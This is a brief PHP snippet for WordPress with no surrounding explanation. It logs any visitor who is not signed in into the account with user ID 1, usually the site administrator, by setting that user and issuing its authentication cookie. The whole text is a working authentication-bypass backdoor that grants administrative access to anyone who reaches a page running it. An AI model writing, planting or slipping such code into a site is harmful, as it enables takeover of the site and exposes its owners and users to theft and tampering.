<?php
if(!is_user_logged_in()) {
$user_id = 1;
wp_clear_auth_cookie();
wp_set_current_user( $user_id );
wp_set_auth_cookie( $user_id );
}
?>